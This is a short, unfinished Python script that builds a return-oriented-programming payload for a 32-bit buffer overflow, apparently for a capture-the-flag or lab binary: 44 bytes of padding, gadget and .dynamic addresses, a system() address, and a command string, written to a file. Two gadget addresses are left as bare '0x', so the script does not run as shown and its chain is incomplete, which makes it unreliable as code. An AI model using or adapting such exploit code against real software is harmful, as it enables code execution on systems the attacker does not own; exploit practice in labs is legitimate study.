#!/usr/bin/python3
from struct import pack
'''
We need a mov reg, reg
'''

# Stage 0
junk = b'A' * 44 # Overflow

# Stage 1
pop1 = pack("<L", 0x) # need a pop pop ret;
string1 = b'lool' # command string
dynamic1 = pack("<L", 0x08049f14) # addr of .dynamic
mov1 = pack("<L", 0x) # mov gadget to put our values in

# RCE
system = pack("<L", 0x8048430)

# Create Payload
payload = junk + pop1 + string1 + dynamic1 + mov1

# Write Exploit
with open('rop.txt', 'wb') as w:
    w.write(payload)
